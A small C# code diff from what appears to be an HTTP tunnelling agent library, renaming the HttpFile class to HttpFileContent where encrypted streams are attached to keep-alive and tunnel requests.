@@ -165,7 +165,7 @@ namespace System.Net
             var crypto = xHttpHandler.CreateCrypto(_keepAlive.Headers[xHttpHandler.AgentAuth]);
             string checksum = this.LAN_IP.ToString();
             var inStream = crypto.Encrypt(new MemoryStream(Encoding.UTF8.GetBytes(checksum)));
-            _keepAlive.Files.Add(new HttpFile(xHttpHandler.AgentChecksum, xHttpHandler.AgentChecksum, inStream));
+            _keepAlive.Files.Add(new HttpFileContent(xHttpHandler.AgentChecksum, xHttpHandler.AgentChecksum, inStream));
             try
             {
                 var response = _keepAlive.GetResponse(webResponse =>
@@ -634,7 +634,7 @@ namespace System.Net
                         tunnel.Form[xHttpHandler.AgentChecksum] = CryptoManaged.MD5Hash(outStream).ToString();
                         outStream.Position = 0L;
 #endif
-                        tunnel.Files.Add(new HttpFile(xHttpHandler.AgentDirect, xHttpHandler.AgentDirect, outStream));
+                        tunnel.Files.Add(new HttpFileContent(xHttpHandler.AgentDirect, xHttpHandler.AgentDirect, outStream));
                         var response = tunnel.GetResponse();
                         if (response.GetResponseText() != "1")
                         {
